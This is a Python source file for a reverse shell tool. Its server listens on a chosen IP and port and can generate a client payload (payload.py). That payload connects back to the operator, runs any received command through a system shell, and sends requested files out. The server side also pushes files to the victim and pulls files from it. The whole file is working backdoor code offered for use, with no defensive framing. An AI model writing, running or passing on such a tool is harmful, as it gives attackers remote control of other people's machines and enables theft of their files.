import socket
import os
import argparse
from colorama import Fore



parser = argparse.ArgumentParser(description="Reverse Shell Server")
parser.add_argument("--ip", type=str, required=True, help="The IP address to listen on")
parser.add_argument("--port", type=int, required=True, help="The port to listen on")
parser.add_argument("--generate-payload", type=bool, default=False, help="Generate the client-side payload")

args = parser.parse_args()

server_host = args.ip
server_port = args.port
generate_payload = args.generate_payload
MAGENTA=Fore.LIGHTMAGENTA_EX
if generate_payload:
        client_code = f"""
import socket
import subprocess
import os

server_host = "{server_host}"
server_port = {server_port}

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((server_host, server_port))

while True:
    command = client_socket.recv(1024).decode()

    if command.lower() == "exit":
        break
    elif command.lower().startswith("cd"):
        _, _, directory = command.strip().partition(" ")
        if os.path.exists(directory) and os.path.isdir(directory):
            os.chdir(directory)
            client_socket.send("[+] Directory changed.".encode())
        else:
            client_socket.send("[-] Directory not found.".encode())
    elif command.lower().startswith("download"):
        _, _, file_path = command.strip().partition(" ")
        if os.path.exists(file_path) and os.path.isfile(file_path):
            client_socket.send("EXISTS".encode())
            with open(file_path, "rb") as file:
                data = file.read()
                client_socket.send(data)
        else:
            client_socket.send("[-] File not found.".encode())
    else:
        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = output.stdout.read() + output.stderr.read()
        client_socket.send(result)

client_socket.close()

"""   
        print(Fore.LIGHTBLUE_EX+"[*]"+Fore.RESET+" Genetrating the payload")
        with open("payload.py", "w") as payload_file:
            payload_file.write(client_code)
        print(MAGENTA+"[^]"+Fore.RESET+" Genetrated the payload successfully [payload.py]")
        exit(0)

        
ASCII="""
 ____ ___              .__    .___     ________                       
|    |   \______  _____|__| __| _/____ \______ \   ______  _  ______  
|    |   /\____ \/  ___/  |/ __ |/ __ \ |    |  \ /  _ \ \/ \/ /    \ 
|    |  / |  |_> >___ \|  / /_/ \  ___/ |    `   (  <_> )     /   |  \\
|______/  |   __/____  >__\____ |\___  >_______  /\____/ \/\_/|___|  /
          |__|       \/        \/    \/        \/                  \/ 
"""

def banner(x):
    os.system('clear')
    print(MAGENTA+x+Fore.RESET)
banner(ASCII)

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((server_host, server_port))
server_socket.listen(5)

print(Fore.LIGHTBLUE_EX+"[*]"+Fore.RESET+" Listening for incoming connections...")

client_socket, client_address = server_socket.accept()
print(Fore.LIGHTBLUE_EX+"[*]"+Fore.RESET+f" Connection established with {client_address[0]}:{client_address[1]}")

while True:
    command = input("Enter command: ")
    client_socket.send(command.encode())

    if command.lower() == "exit":
        break
    elif command.lower().startswith("upload"):
        _, _, file_path = command.strip().partition(" ")
        if os.path.exists(file_path):
            with open(file_path, "rb") as file:
                data = file.read()
                client_socket.send(data)
                print(Fore.LIGHTBLUE_EX+"[*]"+Fore.RESET+" File sent successfully.")
        else:
            print(Fore.LIGHTYELLOW_EX+"[-]"+" File not found.")
    elif command.lower().startswith("download"):
        _, _, file_path = command.strip().partition(" ")
        client_socket.send(command.encode())
        data = client_socket.recv(1024)
        if data[:6] == b"EXISTS":
            with open(file_path, "wb") as file:
                file.write(data[6:])
                print(Fore.LIGHTBLUE_EX+"[*]"+Fore.RESET+" File downloaded successfully.")
        else:
            print(Fore.LIGHTYELLOW_EX+"[-]"+Fore.RESET+" File not found.")
    else:
        result = client_socket.recv(4096).decode()
        print(result)

client_socket.close()
server_socket.close()

